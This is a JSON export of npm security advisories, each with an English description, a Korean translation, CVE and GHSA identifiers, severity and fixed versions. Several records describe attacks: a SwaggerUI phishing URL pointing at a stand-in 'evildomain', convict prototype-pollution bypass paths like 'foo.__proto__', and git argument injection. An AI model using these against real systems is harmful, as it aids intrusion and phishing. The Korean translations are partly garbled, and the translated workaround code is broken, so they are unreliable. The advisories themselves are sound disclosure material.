    "description": "A vulnerability was found in Angular up to 11.0.4/11.1.0-next.2. It has been classified as problematic. Affected is the handling of comments. The manipulation leads to cross site scripting. It is possible to launch the attack remotely but it might require an authentication first. Upgrading to version 11.0.5 and 11.1.0-next.3 is able to address this issue. The name of the patch is ba8da742e3b243e8f43d4c63aa842b44e14f2b09. It is recommended to upgrade the affected component.",
    "identifiers": "GHSA : GHSA-c75v-2vq8-878f\nCVE : CVE-2021-4231",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:03:11Z",
    "publishedAt": "2022-05-27T00:01:08Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4231\nhttps://github.com/angular/angular/issues/40136\nhttps://github.com/angular/angular/commit/ba8da742e3b243e8f43d4c63aa842b44e14f2b09\nhttps://security.snyk.io/vuln/SNYK-JS-ANGULARCORE-1070902\nhttps://vuldb.com/?id.181356\nhttps://github.com/advisories/GHSA-c75v-2vq8-878f",
    "name": "@angular/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 11.1.0-next.0, <= 11.1.0-next.2",
    "identifier": "11.1.0-next.3",
    "descriptionKR": "Angular 11.0.4/11.1.0-next.2까지 취약점이 발견되었습니다. 문제가 있는 것으로 분류되었습니다. 영향을 받는 것은 댓글 처리입니다. 조작은 교차 사이트 스크립팅으로 이어집니다. 공격을 원격으로 시작할 수 있지만 먼저 인증이 필요할 수 있습니다. 버전 11.0.5 및 11.1.0-next.3으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 ba8da742e3b243e8f43d4c63aa842b44e14f2b09입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다."
  },
  {
    "description": "A vulnerability was found in Angular up to 11.0.4/11.1.0-next.2. It has been classified as problematic. Affected is the handling of comments. The manipulation leads to cross site scripting. It is possible to launch the attack remotely but it might require an authentication first. Upgrading to version 11.0.5 and 11.1.0-next.3 is able to address this issue. The name of the patch is ba8da742e3b243e8f43d4c63aa842b44e14f2b09. It is recommended to upgrade the affected component.",
    "identifiers": "GHSA : GHSA-c75v-2vq8-878f\nCVE : CVE-2021-4231",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:03:11Z",
    "publishedAt": "2022-05-27T00:01:08Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4231\nhttps://github.com/angular/angular/issues/40136\nhttps://github.com/angular/angular/commit/ba8da742e3b243e8f43d4c63aa842b44e14f2b09\nhttps://security.snyk.io/vuln/SNYK-JS-ANGULARCORE-1070902\nhttps://vuldb.com/?id.181356\nhttps://github.com/advisories/GHSA-c75v-2vq8-878f",
    "name": "@angular/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 11.0.5",
    "identifier": "11.0.5",
    "descriptionKR": "Angular 11.0.4/11.1.0-next.2까지 취약점이 발견되었습니다. 문제가 있는 것으로 분류되었습니다. 영향을 받는 것은 댓글 처리입니다. 조작은 교차 사이트 스크립팅으로 이어집니다. 공격을 원격으로 시작할 수 있지만 먼저 인증이 필요할 수 있습니다. 버전 11.0.5 및 11.1.0-next.3으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 ba8da742e3b243e8f43d4c63aa842b44e14f2b09입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다."
  },
  {
    "description": "### Impact\n`npm pack` ignores root-level `.gitignore` & `.npmignore` file exclusion directives when run in a workspace or with a workspace flag (ie. `--workspaces`, `--workspace=<name>`). Anyone who has run `npm pack` or `npm publish` with workspaces, as of [v7.9.0](https://github.com/npm/cli/releases/tag/v7.9.0) & [v7.13.0](https://github.com/npm/cli/releases/tag/v7.13.0) respectively, may be affected and have published files into the npm registry they did not intend to include.\n\n### Patch\n- Upgrade to the latest, patched version of `npm` ([`v8.11.0`](https://github.com/npm/cli/releases/tag/v8.11.0) or greater), run: `npm i -g npm@latest`\n- Node.js versions [`v16.15.1`](https://github.com/nodejs/node/releases/tag/v16.15.1), [`v17.19.1`](https://github.com/nodejs/node/releases/tag/v17.9.1) & [`v18.3.0`](https://github.com/nodejs/node/releases/tag/v18.3.0) include the patched `v8.11.0` version of `npm`\n\n#### Steps to take to see if you're impacted\n1. Run `npm publish --dry-run` or `npm pack` with an `npm` version `>=7.9.0` & `<8.11.0` inside the project's root directory using a workspace flag like: `--workspaces` or `--workspace=<name>` (ex. `npm pack --workspace=foo`)\n2. Check the output in your terminal which will list the package contents (note: `tar -tvf <package-on-disk>` also works)\n3. If you find that there are files included you did not expect, you should:\n  3.1. Create & publish a new release excluding those files (ref. [\"Keeping files out of your Package\"](https://docs.npmjs.com/cli/v8/using-npm/developers#keeping-files-out-of-your-package))\n  3.2. Deprecate the old package (ex. `npm deprecate <pkg>[@<version>] <message>`)\n  3.3. Revoke or rotate any sensitive information (ex. passwords, tokens, secrets etc.) which might have been exposed\n### References\n- [CVE-2022-29244](https://nvd.nist.gov/vuln/detail/CVE-2022-29244)\n- [`npm-packlist`](https://github.com/npm/npm-packlist)\n- [`libnpmpack`](https://github.com/npm/cli/tree/latest/workspaces/libnpmpack)\n- [`libnpmpublish`](https://github.com/npm/cli/tree/latest/workspaces/libnpmpublish)",
    "identifiers": "GHSA : GHSA-hj9c-8jmm-8c52\nCVE : CVE-2022-29244",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:54Z",
    "publishedAt": "2022-06-02T15:37:27Z",
    "references": "https://github.com/npm/cli/security/advisories/GHSA-hj9c-8jmm-8c52\nhttps://github.com/nodejs/node/releases/tag/v16.15.1\nhttps://github.com/nodejs/node/releases/tag/v17.9.1\nhttps://github.com/nodejs/node/releases/tag/v18.3.0\nhttps://github.com/npm/cli/releases/tag/v8.11.0\nhttps://github.com/npm/cli/tree/latest/workspaces/libnpmpack\nhttps://github.com/npm/cli/tree/latest/workspaces/libnpmpublish\nhttps://github.com/npm/npm-packlist\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29244\nhttps://github.com/nodejs/node/pull/43210\nhttps://security.netapp.com/advisory/ntap-20220722-0007/\nhttps://github.com/advisories/GHSA-hj9c-8jmm-8c52",
    "name": "npm",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 7.9.0, < 8.11.0",
    "identifier": "8.11.0",
    "descriptionKR": "### 영향\n`npm pack`은 작업 공간에서 또는 작업 공간 플래그(예: `--workspaces`, `--workspace=<name>`)로 실행될 때 루트 수준 `.gitignore` 및 `.npmignore` 파일 제외 지시문을 무시합니다. [v7.9.0](https://github.com/npm/cli/releases/tag/v7.9.0) 및 [v7.13.0] 현재 작업 영역에서 `npm pack` 또는 `npm publish`를 실행한 사람 (https://github.com/npm/cli/releases/tag/v7.13.0) 각각 영향을 받고 포함하지 않으려는 npm 레지스트리에 파일을 게시했을 수 있습니다.\n\n### 패치\n- `npm`([`v8.11.0`](https://github.com/npm/cli/releases/tag/v8.11.0) 이상)의 최신 패치 버전으로 업그레이드하고 다음을 실행합니다. `npm i -g npm@latest`\n- Node.js 버전 [`v16.15.1`](https://github.com/nodejs/node/releases/tag/v16.15.1), [`v17.19.1`](https://github.com/ nodejs/node/releases/tag/v17.9.1) & [`v18.3.0`](https://github.com/nodejs/node/releases/tag/v18.3.0) 패치된 `v8.11.0` 버전 포함 `npm`의\n\n#### 영향을 받는지 확인하기 위한 단계\n1. 다음과 같은 작업 공간 플래그를 사용하여 프로젝트의 루트 디렉터리 내에서 `npm` 버전 `>=7.9.0` 및 `<8.11.0`으로 `npm publish --dry-run` 또는 `npm pack`을 실행합니다. -workspaces` 또는 `--workspace=<name>`(예: `npm pack --workspace=foo`)\n2. 터미널에서 패키지 내용을 나열하는 출력을 확인합니다(참고: `tar -tvf <package-on-disk>`도 작동함).\n3. 예상하지 못한 파일이 포함된 경우 다음을 수행해야 합니다.\n  3.1. 해당 파일을 제외한 새 릴리스 생성 및 게시 -귀하의 패키지))\n  3.2. 이전 패키지 사용 중단(예: `npm deprecate <pkg>[@<version>] <message>`)\n  3.3. 노출되었을 수 있는 민감한 정보(예: 비밀번호, 토큰, 비밀 등)를 취소하거나 교체합니다.\n### 참조\n- [CVE-2022-29244](https://nvd.nist.gov/vuln/detail/CVE-2022-29244)\n- [`npm-packlist`](https://github.com/npm/npm-packlist)\n- [`libnpmpack`](https://github.com/npm/cli/tree/latest/workspaces/libnpmpack)\n- [`libnpmpublish`](https://github.com/npm/cli/tree/latest/workspaces/libnpmpublish)"
  },
  {
    "description": "Prototype pollution vulnerability in 'predefine' versions 0.0.0 through 0.1.2 allows an attacker to cause a denial of service and may lead to remote code execution.",
    "identifiers": "GHSA : GHSA-mx3x-ghqm-r43h\nCVE : CVE-2020-28280",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-01T05:06:09Z",
    "publishedAt": "2021-10-12T16:27:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28280\nhttps://github.com/bigpipe/predefine/blob/238137e3d1b8288ff5d7529c3cbcdd371888c26b/index.js#L284\nhttps://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28280\nhttps://github.com/bigpipe/predefine/commit/1a86a013c0b37c9d6ca078ba34017052af38b7fc\nhttps://github.com/advisories/GHSA-mx3x-ghqm-r43h",
    "name": "predefine",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.1.3",
    "identifier": "0.1.3",
    "descriptionKR": "'predefine' 버전 0.0.0~0.1.2의 프로토타입 오염 취약성으로 인해 공격자가 서비스 거부를 유발하고 원격 코드 실행으로 이어질 수 있습니다."
  },
  {
    "description": "There's a possible vulnerability in logic that is run only at `npm install` time when installing versions of `sharp` prior to the latest v0.30.5.\n\nThis is not part of any runtime code, does not affect Windows users at all, and is unlikely to affect anyone that already cares about the security of their build environment. However, out of an abundance of caution, I've created this advisory.\n\nIf an attacker has the ability to set the value of the `PKG_CONFIG_PATH` environment variable in a build environment then they might be able to use this to inject an arbitrary command at `npm install` time.\n\nI've used the Common Vulnerability Scoring System (CVSS) calculator to determine the maximum possible impact, which suggests a \"medium\" score of 5.9, but for most people the real impact will be dealing with the noise from automated security tooling that this advisory will bring.\n\n[`AV:L/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:R/MS:X/MC:X/MI:X/MA:X`](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:R/MS:X/MC:X/MI:X/MA:X&version=3.1)\n\nThis problem was fixed in commit a6aeef6 and published as part of `sharp` v0.30.5.\n\nThank you very much to @dwisiswant0 for the responsible disclosure.\n\nRemember: if an attacker has control over environment variables in your build environment then you have a bigger problem to deal with than this issue.\n",
    "identifiers": "GHSA : GHSA-gp95-ppv5-3jc5\nCVE : CVE-2022-29256",
    "severity": "MODERATE",
    "updatedAt": "2023-06-30T19:58:07Z",
    "publishedAt": "2022-06-01T19:58:29Z",
    "references": "https://github.com/lovell/sharp/security/advisories/GHSA-gp95-ppv5-3jc5\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29256\nhttps://github.com/lovell/sharp/commit/a6aeef612be50f5868a77481848b1de674216f0c\nhttps://advisory.dw1.io/54\nhttps://github.com/advisories/GHSA-gp95-ppv5-3jc5",
    "name": "sharp",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.30.5",
    "identifier": "0.30.5",
    "descriptionKR": "최신 v0.30.5 이전 버전의 `sharp`를 설치할 때 `npm install` 시간에만 실행되는 로직에 취약점이 있을 수 있습니다.\n\n이것은 런타임 코드의 일부가 아니며 Windows 사용자에게 전혀 영향을 미치지 않으며 이미 빌드 환경의 보안에 관심이 있는 사람에게는 영향을 미치지 않을 것입니다. 그러나 많은 주의를 기울여 이 권고를 만들었습니다.\n\n공격자가 빌드 환경에서 `PKG_CONFIG_PATH` 환경 변수의 값을 설정할 수 있는 능력이 있는 경우 이를 사용하여 `npm install` 시간에 임의의 명령을 주입할 수 있습니다.\n\nCVSS(Common Vulnerability Scoring System) 계산기를 사용하여 가능한 최대 영향을 결정했습니다. \"중간\" 점수는 5.9이지만 대부분의 사람들에게 실질적인 영향은 이 권고가 제공하는 자동화된 보안 도구의 소음을 처리하는 것입니다. 가져올 것이다.\n\n[`AV:L/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C/CR:X/ IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:R/MS:X/MC:X/MI:X/MA:X`](https://nvd.nist. gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:H/E:P/ RL:O/RC:C/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:R/MS:X/MC:X/MI:X/MA: X버전=3.1)\n\n이 문제는 커밋 a6aeef6에서 수정되었으며 `sharp` v0.30.5의 일부로 게시되었습니다.\n\n책임있는 공개에 대해 @dwisiswant0에게 대단히 감사합니다.\n\n기억하세요: 공격자가 빌드 환경에서 환경 변수를 제어할 수 있는 경우 이 문제보다 처리해야 할 더 큰 문제가 있습니다."
  },
  {
    "description": "SwaggerUI supports displaying remote OpenAPI definitions through the `?url` parameter. This enables robust demonstration capabilities on sites like `petstore.swagger.io`, `editor.swagger.io`, and similar sites, where users often want to see what their OpenAPI definitions would look like rendered.\n\nHowever, this functionality may pose a risk for users who host their own SwaggerUI instances. In particular, including remote OpenAPI definitions opens a vector for phishing attacks by abusing the trusted names/domains of self-hosted instances.\n\nAn example scenario abusing this functionality could take the following form:\n- `https://example.com/api-docs` hosts a version of SwaggerUI with `?url=` query parameter enabled.\n- Users will trust the domain `https://example.com` and the contents of the OpenAPI definition.\n- A malicious actor may craft a similar OpenAPI definition and service that responds to the defined APIs at `https://evildomain`.\n- Users mistakenly click a phishing URL like `https://example.com/api-docs?url=https://evildomain/fakeapi.yaml` and enters sensitive data via the \"Try-it-out\" feature.\n\nWe do want to stress that this attack vector is limited to scenarios that actively trick users into divulging sensitive information. The ease of this is highly contextual and, therefore, the threat model may be different for individual users and organizations. It is *not* possible to perform non-interactive attacks (e.g., cross-site scripting or code injection) through this mechanism.\n\n### Resolution \nWe've made the decision to [disable query parameters (#4872)](https://github.com/swagger-api/swagger-ui/issues/4872) by default starting with SwaggerUI version `4.1.3`. Please update to this version when it becomes available (**ETA: 2021 December**). Users will still be able to be re-enable the options at their discretion. We'll continue to enable query parameters on the Swagger demo sites.\n\n### Workaround\nIf you host a version of SwaggerUI and wish to mitigate this issue immediately, you are encouraged to add the following custom plugin code:\n\n```js\nSwaggerUI({\n  //  ...other configuration options,\n  plugins: [function UrlParamDisablePlugin() {\n    return {\n      statePlugins: {\n        spec: {\n          wrapActions: {\n            // Remove the ?url parameter from loading an external OpenAPI definition.\n            updateUrl: (oriAction) => (payload) => {\n              const url = new URL(window.location.href)\n              if (url.searchParams.has('url')) {\n                url.searchParams.delete('url')\n                window.location.replace(url.toString())\n              }\n              return oriAction(payload)\n            }\n          }\n        }\n      }\n    }\n  }],\n})\n```\n\n### Future UX work\n\nThrough the exploration of this issue, it became apparent that users may not be aware to which web server the Try-it-out function will send requests. While this information is currently presented at the top of the page, understanding may improve by displaying it closer to the \"Execute\" button where requests are actually made. We'll be exploring these UX improvements over the coming months and welcome community input. Please create a Feature Request under the GitHub Issue tab to start a conversation with us and the community.\n\n## Reflected XSS attack\n\n**Warning** in versions < 3.38.0, it is possible to combine the URL options (as mentioned above) with a vulnerability in DOMPurify (https://www.cvedetails.com/cve/CVE-2020-26870/) to create a reflected XSS vector. If your version of Swagger UI is older than 3.38.0, we suggest you upgrade or implement the workaround as mentioned above.\n",
    "identifiers": "GHSA : GHSA-qrmm-w75w-3wpx",
    "severity": "MODERATE",
    "updatedAt": "2023-06-02T21:23:46Z",
    "publishedAt": "2021-12-09T19:08:38Z",
    "references": "https://github.com/swagger-api/swagger-ui/security/advisories/GHSA-qrmm-w75w-3wpx\nhttps://github.com/swagger-api/swagger-ui/issues/4872\nhttps://github.com/swagger-api/swagger-ui/commit/01a3e55960f864a0acf6a8d06e5ddaf6776a7f76\nhttps://github.com/domaindrivendev/Swashbuckle.AspNetCore/commit/401c7cb81e5efe835ceb8aae23e82057d57c7d29\nhttps://github.com/advisories/GHSA-qrmm-w75w-3wpx",
    "name": "swagger-ui-react",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.1.3",
    "identifier": "4.1.3",
    "descriptionKR": "SwaggerUI는 `?url` 매개변수를 통해 원격 OpenAPI 정의 표시를 지원합니다. 이를 통해 `petstore.swagger.io`, `editor.swagger.io`와 같은 사이트 및 사용자가 종종 OpenAPI 정의가 렌더링되는 모습을 보고 싶어하는 유사한 사이트에서 강력한 데모 기능을 사용할 수 있습니다.\n\n그러나 이 기능은 자체 SwaggerUI 인스턴스를 호스팅하는 사용자에게 위험을 초래할 수 있습니다. 특히, 원격 OpenAPI 정의를 포함하면 자체 호스팅 인스턴스의 신뢰할 수 있는 이름/도메인을 남용하여 피싱 공격에 대한 벡터를 엽니다.\n\n이 기능을 악용하는 예제 시나리오는 다음 형식을 취할 수 있습니다.\n- `https://example.com/api-docs`는 `?url=` 쿼리 매개변수가 활성화된 SwaggerUI 버전을 호스팅합니다.\n- 사용자는 `https://example.com` 도메인과 OpenAPI 정의의 내용을 신뢰합니다.\n- 악의적인 행위자는 `https://evildomain`에서 정의된 API에 응답하는 유사한 OpenAPI 정의 및 서비스를 만들 수 있습니다.\n- 사용자가 `https://example.com/api-docs?url=https://evildomain/fakeapi.yaml`과 같은 피싱 URL을 실수로 클릭하고 \"Try-it-out\" 기능을 통해 민감한 데이터를 입력합니다.\n\n우리는 이 공격 벡터가 민감한 정보를 누설하도록 사용자를 능동적으로 속이는 시나리오로 제한된다는 점을 강조하고 싶습니다. 이 작업의 용이성은 매우 상황에 따라 다르므로 개별 사용자 및 조직에 따라 위협 모델이 다를 수 있습니다. 이 메커니즘을 통해 비대화형 공격(예: 교차 사이트 스크립팅 또는 코드 주입)을 수행하는 것은 *불가능*합니다.\n\n### 해결\nSwaggerUI 버전 `4.1.3`부터 기본적으로 [쿼리 매개변수 비활성화(#4872)](https://github.com/swagger-api/swagger-ui/issues/4872)하기로 결정했습니다. 사용 가능해지면 이 버전으로 업데이트하세요(**ETA: 2021년 12월**). 사용자는 여전히 재량에 따라 옵션을 다시 활성화할 수 있습니다. Swagger 데모 사이트에서 쿼리 매개변수를 계속 활성화할 예정입니다.\n\n### 해결 방법\nSwaggerUI 버전을 호스팅하고 이 문제를 즉시 완화하려는 경우 다음 사용자 정의 플러그인 코드를 추가하는 것이 좋습니다.\n\n```js\nSwaggerUI({\n  // ...기타 구성 옵션,\n  플러그인: [function UrlParamDisablePlugin() {\n    반품 {\n      statePlugins: {\n        사양: {\n          wrapActions: {\n            // 외부 OpenAPI 정의 로드에서 ?url 매개변수를 제거합니다.\n            updateUrl: (oriAction) => (페이로드) => {\n              const url = 새 URL(window.location.href)\n              if (url.searchParams.has('url')) {\n                url.searchParams.delete('url')\n                window.location.replace(url.toString())\n              }\n              oriAction(페이로드) 반환\n            }\n          }\n        }\n      }\n    }\n  }],\n})\n```\n\n### 미래 UX 작업\n\n이 문제에 대한 탐색을 통해 사용자가 Try-it-out 기능이 요청을 보내는 웹 서버를 인식하지 못할 수 있음이 분명해졌습니다. 이 정보는 현재 페이지 상단에 표시되어 있지만 실제로 요청이 이루어지는 \"실행\" 버튼에 더 가깝게 표시하면 이해가 향상될 수 있습니다. 우리는 앞으로 몇 달 동안 이러한 UX 개선 사항을 살펴보고 커뮤니티 의견을 환영할 것입니다. GitHub 문제 탭에서 기능 요청을 작성하여 당사 및 커뮤니티와 대화를 시작하십시오.\n\n## 반영된 XSS 공격\n\n**경고** 버전 < 3.38.0에서는 URL 옵션(위에서 언급한 대로)을 DOMPurify(https://www.cvedetails.com/cve/CVE-2020-26870/)의 취약점과 결합할 수 있습니다. 반영된 XSS 벡터를 생성합니다. Swagger UI 버전이 3.38.0보다 오래된 경우 위에서 언급한 해결 방법을 업그레이드하거나 구현하는 것이 좋습니다."
  },
  {
    "description": "### Impact\n\n* An attacker can inject attributes that are used in other components\n* An attacker can override existing attributes with ones that have incompatible type, which may lead to a crash.\n\nThe main use case of Convict is for handling server-side configurations written by the admins owning the servers, and not random users. So it's unlikely that an admin would deliberately sabotage their own server. Still a situation can happen where an admin not knowledgeable about JavaScript could be tricked by an attacker into writing the malicious JavaScript code into some config files.\n\n### Patches\n\nThe problem is patched in `convict@6.2.3`. Users should upgrade to `convict@6.2.3`.\n\n### Workarounds\n\nNo way for users to fix or remediate the vulnerability without upgrading\n\n### References\n\n* https://www.huntr.dev/bounties/1-npm-convict/\n* #384\n* 3b86be087d8f14681a9c889d45da7fe3ad9cd880\n* 1ea0ab19c5208f66509e1c43b0d0f21c1fd29b75\n\n### For more information\n\nIf you have any questions or comments about this advisory: \nadd your question as a comment in #384 \n",
    "identifiers": "GHSA : GHSA-x2w5-725j-gf2g\nCVE : CVE-2022-22143",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:01:51Z",
    "publishedAt": "2022-04-20T16:21:03Z",
    "references": "https://github.com/mozilla/node-convict/security/advisories/GHSA-x2w5-725j-gf2g\nhttps://github.com/mozilla/node-convict/pull/384\nhttps://github.com/mozilla/node-convict/commit/3b86be087d8f14681a9c889d45da7fe3ad9cd880\nhttps://github.com/mozilla/node-convict/releases/tag/v6.2.2\nhttps://www.huntr.dev/bounties/1-npm-convict/\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-22143\nhttps://github.com/mozilla/node-convict/blob/5eb1314f85346760a3c31cb14510f2f0af11d0d3/packages/convict/src/main.js%23L569\nhttps://snyk.io/vuln/SNYK-JS-CONVICT-2340604\nhttps://github.com/advisories/GHSA-x2w5-725j-gf2g",
    "name": "convict",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.2.3",
    "identifier": "6.2.3",
    "descriptionKR": "### 영향\n\n* 공격자는 다른 구성 요소에서 사용되는 속성을 주입할 수 있습니다.\n* 공격자는 충돌로 이어질 수 있는 호환되지 않는 유형을 가진 속성으로 기존 속성을 재정의할 수 있습니다.\n\nConvict의 주요 사용 사례는 무작위 사용자가 아닌 서버를 소유한 관리자가 작성한 서버 측 구성을 처리하는 것입니다. 따라서 관리자가 의도적으로 자신의 서버를 방해할 가능성은 거의 없습니다. 여전히 JavaScript에 대해 잘 모르는 관리자가 공격자에게 속아 악성 JavaScript 코드를 일부 구성 파일에 작성하도록 할 수 있는 상황이 발생할 수 있습니다.\n\n### 패치\n\n해당 문제는 `convict@6.2.3`에서 패치되었습니다. 사용자는 `convict@6.2.3`으로 업그레이드해야 합니다.\n\n### 해결 방법\n\n사용자가 업그레이드하지 않고는 취약점을 수정하거나 치료할 수 있는 방법이 없습니다.\n\n### 참조\n\n* https://www.huntr.dev/bounties/1-npm-convict/\n* #384\n* 3b86be087d8f14681a9c889d45da7fe3ad9cd880\n* 1ea0ab19c5208f66509e1c43b0d0f21c1fd29b75\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n질문을 #384에 댓글로 추가하세요."
  },
  {
    "description": "This affects the package convict before 6.2.3. This is a bypass of [CVE-2022-22143](https://security.snyk.io/vuln/SNYK-JS-CONVICT-2340604). The [fix](https://github.com/mozilla/node-convict/commit/3b86be087d8f14681a9c889d45da7fe3ad9cd880) introduced, relies on the startsWith method and does not prevent the vulnerability: before splitting the path, it checks if it starts with __proto__ or this.constructor.prototype. To bypass this check it's possible to prepend the dangerous paths with any string value followed by a dot, like for example foo.__proto__ or foo.this.constructor.prototype.",
    "identifiers": "GHSA : GHSA-jjf5-wx3j-3fv7\nCVE : CVE-2022-21190",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-02T05:02:18Z",
    "publishedAt": "2022-05-14T00:01:09Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21190\nhttps://github.com/mozilla/node-convict/commit/1ea0ab19c5208f66509e1c43b0d0f21c1fd29b75\nhttps://gist.github.com/dellalibera/cebce20e51410acebff1f46afdc89808\nhttps://github.com/mozilla/node-convict/blob/3b86be087d8f14681a9c889d45da7fe3ad9cd880/packages/convict/src/main.js%23L571\nhttps://github.com/mozilla/node-convict/blob/master/CHANGELOG.md%23623---2022-05-07\nhttps://snyk.io/vuln/SNYK-JS-CONVICT-2774757\nhttps://github.com/advisories/GHSA-jjf5-wx3j-3fv7",
    "name": "convict",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.2.3",
    "identifier": "6.2.3",
    "descriptionKR": "이것은 6.2.3 이전의 패키지 유죄 판결에 영향을 미칩니다. 이것은 [CVE-2022-22143](https://security.snyk.io/vuln/SNYK-JS-CONVICT-2340604)의 우회입니다. 도입된 [fix](https://github.com/mozilla/node-convict/commit/3b86be087d8f14681a9c889d45da7fe3ad9cd880)는 startsWith 메서드에 의존하며 취약점을 방지하지 않습니다. 경로를 분할하기 전에 __proto__ 또는 this.constructor.prototype. 이 검사를 우회하기 위해 예를 들어 foo.__proto__ 또는 foo.this.constructor.prototype과 같이 점 뒤에 오는 문자열 값을 위험한 경로 앞에 추가할 수 있습니다."
  },
  {
    "description": "This affects the package sds from 0.0.0. The library could be tricked into adding or modifying properties of the Object.prototype by abusing the set function located in js/set.js. **Note:** This vulnerability derives from an incomplete fix to CVE-2020-7618",
    "identifiers": "GHSA : GHSA-ph28-wwfj-fv7f\nCVE : CVE-2022-25862",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:02:24Z",
    "publishedAt": "2022-05-14T00:01:08Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25862\nhttps://github.com/monsterkodi/sds/blob/master/js/set.js\nhttps://snyk.io/vuln/SNYK-JS-SDS-2385944\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-7618\nhttps://github.com/advisories/GHSA-ph28-wwfj-fv7f",
    "name": "sds",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.4.0",
    "descriptionKR": "이것은 0.0.0부터 패키지 sds에 영향을 미칩니다. 라이브러리는 js/set.js에 있는 set 함수를 남용하여 Object.prototype의 속성을 추가하거나 수정하도록 속일 수 있습니다. **참고:** 이 취약점은 CVE-2020-7618에 대한 불완전한 수정에서 파생됩니다."
  },
  {
    "description": "This affects all versions of package dicer. A malicious attacker can send a modified form to server, and crash the nodejs service. A complete denial of service can be achived by sending the malicious form in a loop.",
    "identifiers": "GHSA : GHSA-wm7h-9275-46v2\nCVE : CVE-2022-24434",
    "severity": "HIGH",
    "updatedAt": "2023-07-28T22:40:36Z",
    "publishedAt": "2022-05-21T00:00:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-24434\nhttps://github.com/mscdex/busboy/issues/250\nhttps://github.com/mscdex/dicer/pull/22\nhttps://snyk.io/vuln/SNYK-JS-DICER-2311764\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2838865\nhttps://github.com/mscdex/dicer/commit/b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac\nhttps://github.com/advisories/GHSA-wm7h-9275-46v2",
    "name": "dicer",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.3.1",
    "descriptionKR": "이는 패키지 다이서의 모든 버전에 영향을 미칩니다. 악의적인 공격자는 수정된 양식을 서버에 보내고 nodejs 서비스를 중단시킬 수 있습니다. 완전한 서비스 거부는 악성 형식을 루프로 전송하여 달성할 수 있습니다."
  },
  {
    "description": "An arbitrary file upload vulnerability in the file upload module of Tiddlywiki5 v5.2.2 allows attackers to execute arbitrary code via a crafted SVG file.",
    "identifiers": "GHSA : GHSA-cr9c-rhq6-vh53\nCVE : CVE-2022-29351",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-03T05:01:08Z",
    "publishedAt": "2022-05-17T00:01:44Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-29351\nhttps://github.com/Jermolene/TiddlyWiki5\nhttps://github.com/jimcola99/corruptsvgfile\nhttps://www.youtube.com/watch?v=F_DBx4psWns\nhttp://tiddlywiki5.com\nhttps://github.com/advisories/GHSA-cr9c-rhq6-vh53",
    "name": "tiddlywiki",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 5.2.2",
    "descriptionKR": "Tiddlywiki5 v5.2.2의 파일 업로드 모듈에 있는 임의 파일 업로드 취약성으로 인해 공격자는 제작된 SVG 파일을 통해 임의 코드를 실행할 수 있습니다."
  },
  {
    "description": "The package workspace-tools before 0.18.4 is vulnerable to Command Injection via git argument injection. When calling the fetchRemoteBranch(remote: string, remoteBranch: string, cwd: string) function, both the remote and remoteBranch parameters are passed to the git fetch subcommand in a way that additional flags can be set. The additional flags can be used to perform a command injection.",
    "identifiers": "GHSA : GHSA-5875-m6jq-vf78\nCVE : CVE-2022-25865",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-02T05:02:18Z",
    "publishedAt": "2022-05-14T00:01:08Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25865\nhttps://github.com/microsoft/workspace-tools/pull/103\nhttps://github.com/microsoft/workspace-tools/commit/9bc7e65ce497f87e1f363fd47b8f802f3d3cd978\nhttps://snyk.io/vuln/SNYK-JS-WORKSPACETOOLS-2421201\nhttps://github.com/advisories/GHSA-5875-m6jq-vf78",
    "name": "workspace-tools",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.18.4",
    "identifier": "0.18.4",
